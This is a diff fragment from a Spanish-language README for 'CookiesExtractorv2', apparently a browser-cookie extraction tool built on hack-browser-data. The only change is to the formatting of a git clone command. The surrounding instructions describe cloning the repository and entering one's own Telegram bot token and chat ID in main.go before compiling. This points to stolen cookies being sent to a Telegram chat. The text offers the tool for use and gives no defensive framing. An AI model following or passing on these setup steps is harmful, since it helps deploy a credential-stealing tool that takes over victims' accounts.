@@ -75,8 +75,7 @@ Based on Apple's security policy, some browsers **require a current user passwor
 La instalación de CookiesExtractorv2 es muy sencilla:
 Descarga el proyecto o clona el repositorio
 
-### Clona tu repositorio
-git clone https://github.com/GrpDsG20/CookiesExtractorv2
+$ git clone https://github.com/GrpDsG20/CookiesExtractorv2
 
 Configura tu bot de Telegram:
 Antes de compilar, necesitas editar el archivo main.go en la ruta cmd/hack-browser-data/main.go. Busca las líneas TelegramToken y ChatID y reemplaza los valores por tu propio token de bot de Telegram y el ID de tu chat.
